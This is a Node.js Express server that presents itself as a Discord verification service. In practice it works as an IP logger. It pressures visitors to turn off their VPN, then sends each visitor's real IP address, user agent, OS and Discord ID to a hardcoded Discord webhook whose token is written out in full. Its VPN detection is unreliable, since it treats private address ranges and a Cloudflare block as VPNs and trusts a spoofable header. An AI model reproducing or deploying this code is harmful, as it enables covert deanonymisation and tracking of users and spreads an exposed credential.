const express = require('express');
const session = require('express-session');
const axios = require('axios');
const ipaddr = require('ipaddr.js');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());
app.use(session({
    secret: 'your-secret-key',
    resave: false,
    saveUninitialized: false,
    cookie: { secure: process.env.NODE_ENV === 'production' }
}));
app.use(express.static('public'));

function getOS(userAgent) {
    if (/Windows/i.test(userAgent)) return 'Windows';
    if (/Macintosh|Mac OS/i.test(userAgent)) return 'MacOS';
    if (/Linux/i.test(userAgent)) return 'Linux';
    if (/Android/i.test(userAgent)) return 'Android';
    if (/iPhone|iPad|iPod/i.test(userAgent)) return 'iOS';
    return 'Unknown';
}

function isVPN(ip) {
    if (!ipaddr.isValid(ip)) return 'Invalid IP';
    const addr = ipaddr.parse(ip);
    if (addr.range() !== 'unicast') return 'Private/Reserved IP - VPN likely';
    const vpnRanges = [
        '104.16.0.0/12', '172.16.0.0/12', '10.0.0.0/8', '192.168.0.0/16',
        '100.64.0.0/10', '169.254.0.0/16'
    ];
    for (const range of vpnRanges) {
        const [subnet, mask] = range.split('/');
        const subnetAddr = ipaddr.parse(subnet);
        if (addr.match(subnetAddr, parseInt(mask))) {
            return `VPN Detected - Matches range: ${range}`;
        }
    }
    return false;
}

app.post('/verify', async (req, res) => {
    const userId = req.body.user_id || req.query.user;
    if (!userId || !/^\d+$/.test(userId)) {
        console.error(`Invalid user ID: ${userId}`);
        return res.status(400).json({ status: 'error', message: 'Invalid or missing user ID' });
    }

    const userAgent = req.headers['user-agent'] || 'Unknown';
    const os = getOS(userAgent);
    const forwarded = req.headers['x-forwarded-for'] || '';
    const ipAddress = forwarded ? forwarded.split(',')[0].trim() : (req.ip || 'Unknown');

    const vpnStatus = isVPN(ipAddress);
    if (vpnStatus) {
        console.error(`VPN detected for IP: ${ipAddress} - ${vpnStatus}`);
        return res.status(403).send(`
            <!DOCTYPE html>
            <html>
            <head><title>VPN Detected</title>
            <style>body{background:#1e1e2f;color:#d1d1d6;text-align:center;padding:20px;font-family:Arial,Helvetica,sans-serif}</style>
            </head>
            <body><h1 style="color:#b0b0b3">VPN Detected</h1>
            <p style="color:#88898f">Debug: ${vpnStatus}. Please disable your VPN and try again.</p>
            </body>
            </html>
        `);
    }

    const sessionKey = `verified_${userId}_${ipAddress}`;
    if (req.session[sessionKey]) {
        return res.json({ status: 'already_verified' });
    }
    req.session[sessionKey] = true;

    const payload = {
        content: '',
        username: 'Verification System',
        embeds: [{
            title: 'Verification Success',
            description: `User <@${userId}> has been verified.`,
            color: 65280,
            fields: [{
                name: 'Details',
                value: `ID: ${userId}\nIP: ${ipAddress}\nOS: ${os}\nUser Agent: ${userAgent.substring(0, 100)}\nTime: ${new Date().toISOString()}`,
                inline: false
            }]
        }],
        status: 'verified',
        discord_user_id: userId,
        ip_address: ipAddress,
        user_agent: userAgent.substring(0, 1000),
        os: os,
        timestamp: new Date().toISOString()
    };

    try {
        await axios.post('https://discord.com/api/webhooks/1426256242690625600/jw-wr_1D7IL7sy62Zn608UgN1UXXE8BURCtmPZmMUq-QKizwKFoxOKSahLJhIZKTjfZe', payload);
        res.json({ status: 'success' });
    } catch (error) {
        console.error(`Webhook failed for user ${userId}: ${error.message}`);
        res.status(500).json({ status: 'error', message: 'Failed to send webhook' });
    }
});

app.listen(port, () => console.log(`Server running on port ${port}`));
